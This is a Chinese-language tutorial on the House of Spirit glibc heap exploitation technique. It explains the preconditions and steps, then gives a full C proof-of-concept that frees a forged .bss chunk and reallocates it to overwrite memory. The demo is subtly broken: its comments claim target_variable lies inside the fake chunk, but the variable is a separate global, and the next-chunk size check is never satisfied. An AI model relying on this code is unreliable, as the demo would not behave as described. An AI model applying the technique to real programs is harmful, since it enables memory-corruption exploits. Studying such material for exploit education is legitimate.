# 深入理解堆利用：House of Spirit

## House of Spirit 简介

House of Spirit (HoS) 是一种经典的 glibc 堆利用技术。它的核心思想是构造一个“假”的堆块（fake chunk），然后欺骗 `free()` 函数去释放这个假区块，从而将其纳入堆管理器的空闲列表（如 fastbin 或 tcache）中。 最终，当我们再次 `malloc()` 时，就能分配到这个位于任意内存地址（例如 `.bss` 段、栈上或 `.got.plt` 表）的假区块，从而实现任意地址写入或控制执行流。

## 一、由来

House of Spirit 最早由 "Phantasmal Phantasmagoria" 在 2005 年的 Phrack 杂志第 63 期文章《The Malloc Maleficarum - Glibc Malloc Exploitation Techniques》中提出。

它是一种利用 `free()` 函数校验疏忽的技巧。早期的 `free()` 函数在释放一个堆块时，对其指针的合法性校验非常宽松，它仅仅假设传入的指针确实指向一个由 `malloc` 分配的有效堆块的数据区。HoS 就是抓住了这个“信任”的空隙。

## 二、利用场景

要成功实施 House of Spirit，你需要满足以下几个关键条件：

1. **任意地址写入（或部分写入）**：
   你必须有能力将一个指针变量（这个指针稍后会被程序 `free()`）覆盖为你所控制的地址。

   这通常由其他漏洞实现，例如：

   - 缓冲区溢出（Buffer Overflow）：覆盖栈上或 `.bss` 段上的指针变量。
   - 任意地址写（Arbitrary Write）：如格式化字符串漏洞。
   - Use-After-Free (UAF)：利用 UAF 漏洞向已释放的堆块中写入数据，恰好覆盖了另一个指向堆的指针。

2. **一个可控的内存区域**：
   你需要一块已知地址的内存区域（如 `.bss` 段的全局变量、栈上数组）来构造你的假区块。

3. **触发 `free()`**：
   程序中必须有一处逻辑，会调用 `free(ptr)`，而 `ptr` 就是被你覆盖的那个指针变量。

### 利用流程简介：

1. 在已知地址（如 `.bss` 段的全局数组 `fake_chunk_buffer`）精心构造一个假区块。
2. 这个假区块必须有一个合法的 `size` 字段（例如 `0x71`，表示 `0x70` 大小并标记前一个块正在使用）。
3. 利用漏洞（如缓冲区溢出），将一个即将被 `free()` 的指针 `ptr` 覆盖为 `&fake_chunk_buffer[2]`（即假区块的“数据区”地址）。
4. 程序执行 `free(ptr)`。
5. 程序稍后调用 `malloc(0x68)`，从 fastbin 链表中取出这个假区块。
6. 最终获得一个指向 `.bss` 段的“堆指针”，实现任意地址写入。

## 三、简单示例展示机制

我们用一个简单的 C 语言（伪代码）示例来演示核心机制：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 假设 target_variable 是我们的攻击目标，我们想覆盖它
char target_variable[20] = "I am safe.";

// 1. 在 .bss 段（全局变量）上构造我们的假区块
// 我们将假区块构造在 target_variable *之前*
// 内存布局： [ fake_chunk_header ] [ target_variable ]
// (在64位系统上，指针大小为8字节)

struct {
    long long prev_size; // 8字节
    long long size;      // 8字节
    char data[20];       // 我们的 target_variable 将会在这里
} fake_chunk_area;

// ptr_to_be_freed 是一个即将被释放的指针
// 在真实漏洞中，我们就是利用溢出等手段来覆盖这个指针
void *ptr_to_be_freed;

int main() {
    printf("House of Spirit 演示\n");
    printf("----------------------------------\n");

    // 2. 精心构造假区块
    // 我们要让 malloc 返回指向 fake_chunk_area.data 的指针
    // (即 target_variable 的地址)

    // fake_chunk_area 的地址就是 target_variable 的地址减去 0x10
    void *fake_chunk_ptr = (void*)&fake_chunk_area;

    // 设置 prev_size (通常为 0)
    fake_chunk_area.prev_size = 0;

    // 3. 设置 size 字段，这是最关键的一步
    // 假设我们目标是 0x70 大小的 fastbin
    // size 必须是 0x70 (块大小) | 0x1 (PREV_INUSE 标志位) = 0x71
    fake_chunk_area.size = 0x71; 

    printf("目标变量 (之前): %s\n", target_variable);
    printf("在 .bss 段 %p 处构造了假区块\n", fake_chunk_ptr);
    printf("假区块的 size 字段为: 0x%llx\n", fake_chunk_area.size);

    // 4. 模拟漏洞：覆盖 ptr_to_be_freed
    // 我们让它指向假区块的 "数据区"
    // `free` 会自动查找 ptr - 0x10 的位置作为块头部
    ptr_to_be_freed = (void*)&fake_chunk_area.data; 
    printf("模拟漏洞：ptr_to_be_freed 被覆盖为: %p\n", ptr_to_be_freed);

    // 5. 触发 free()
    // `free` 检查 (ptr_to_be_freed - 0x10) 处的 size (即 0x71)
    // 它认为这是一个合法的 fastbin 块，并将其放入 0x70 的 fastbin 链表
    printf("调用 free(ptr_to_be_freed)...\n");
    free(ptr_to_be_freed);
    printf("假区块已被放入 fastbin 链表。\n");

    // 6. 触发 malloc()
    // 请求一个 0x68 大小的块，glibc 会从 0x70 的 fastbin 链表中分配
    printf("调用 malloc(0x68)...\n");
    void *attacker_ptr = malloc(0x68);

    printf("malloc 返回的地址: %p\n", attacker_ptr);
    printf("我们希望的地址:     %p\n", &fake_chunk_area.data);

    if (attacker_ptr == (void*)&fake_chunk_area.data) {
        printf("攻击成功！malloc 返回了我们控制的 .bss 地址。\n");

        // 7. 任意地址写入
        // 现在，程序以为 attacker_ptr 是一个普通堆块，并向其写入数据
        // 但实际上它正在写入 .bss 段的 target_variable
        printf("向 attacker_ptr 写入 'PWNED!'...\n");
        strcpy(attacker_ptr, "PWNED!");

        printf("目标变量 (之后): %s\n", target_variable);

    } else {
        printf("攻击失败。\n");
    }

    return 0;
}
```

## 注意事项

上述代码是一个原理性演示。在现代 glibc (如 2.27+) 中，`free` 增加了对 fastbin 块的额外检查（例如，`fd` 指针不能指向同一个块，以及 `size` 字段的校验），但在 2.23 等旧版本或 tcache 中（tcache 校验更松），HoS 及其变种仍然有效。